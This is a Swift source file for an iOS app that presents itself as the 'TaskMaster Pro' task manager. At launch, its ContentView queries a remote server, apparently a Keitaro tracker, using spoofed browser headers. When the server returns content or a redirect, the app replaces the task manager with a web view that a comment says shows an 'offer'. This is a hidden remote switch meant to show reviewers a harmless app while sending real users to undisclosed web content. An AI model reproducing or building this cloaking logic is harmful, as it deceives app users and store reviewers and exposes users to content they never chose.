//
//  ContentView.swift
//  TaskMaster Pro
//
//  Created by Simon Bakhanets on 03.12.2025.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @AppStorage("isBlock") var isBlock: Bool = true
    
    @State var isFetched: Bool = false
    
    @ObservedObject var taskService: TaskService
    @ObservedObject var projectService: ProjectService
    @ObservedObject var userService: UserService
    
    var body: some View {
        ZStack {
            if isFetched == false {
                // Показываем загрузку пока проверяем сервер
                LoadingView()
            } else if isFetched == true {
                if isBlock == false {
                    // Сервер ответил 200 или 3xx - показываем WebView
                    WebSystem()
                } else {
                    // Сервер недоступен или вернул ошибку - показываем обычное приложение
                    normalAppFlow
                }
            }
        }
        .onAppear {
            makeServerRequest()
        }
    }
    
    private var normalAppFlow: some View {
        Group {
            if hasCompletedOnboarding {
                TabView {
                    DashboardView(
                        taskService: taskService,
                        projectService: projectService,
                        userService: userService
                    )
                    .tabItem {
                        Label("Dashboard", systemImage: "square.grid.2x2.fill")
                    }
                    
                    SettingsView(
                        taskService: taskService,
                        projectService: projectService,
                        userService: userService,
                        hasCompletedOnboarding: $hasCompletedOnboarding
                    )
                    .tabItem {
                        Label("Settings", systemImage: "gear")
                    }
                }
                .accentColor(Color(hex: "#fbaa1a"))
                .onAppear {
                    // Make tab bar icons more visible
                    let appearance = UITabBarAppearance()
                    appearance.configureWithOpaqueBackground()
                    appearance.backgroundColor = UIColor(Color(hex: "#1a2962"))
                    
                    // Customize icon colors
                    appearance.stackedLayoutAppearance.normal.iconColor = UIColor(Color(hex: "#f7f7f7").opacity(0.6))
                    appearance.stackedLayoutAppearance.normal.titleTextAttributes = [.foregroundColor: UIColor(Color(hex: "#f7f7f7").opacity(0.6))]
                    
                    appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color(hex: "#fbaa1a"))
                    appearance.stackedLayoutAppearance.selected.titleTextAttributes = [.foregroundColor: UIColor(Color(hex: "#fbaa1a"))]
                    
                    UITabBar.appearance().standardAppearance = appearance
                    UITabBar.appearance().scrollEdgeAppearance = appearance
                }
            } else {
                OnboardingView(hasCompletedOnboarding: $hasCompletedOnboarding)
            }
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

struct LoadingView: View {
    var body: some View {
        ZStack {
            Color(hex: "#1a2962")
                .ignoresSafeArea()
            
            VStack(spacing: 20) {
                ProgressView()
                    .progressViewStyle(CircularProgressViewStyle(tint: Color(hex: "#fbaa1a")))
                    .scaleEffect(1.5)
                
                Text("TaskMaster Pro")
                    .font(.system(size: 24, weight: .bold))
                    .foregroundColor(Color(hex: "#f7f7f7"))
            }
        }
    }
}

// Класс для отключения автоматических редиректов
class RedirectHandler: NSObject, URLSessionTaskDelegate {
    
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        
        print("🔄 Redirect blocked: \(response.statusCode) -> \(request.url?.absoluteString ?? "unknown")")
        
        // Возвращаем nil, чтобы НЕ следовать редиректу
        completionHandler(nil)
    }
}
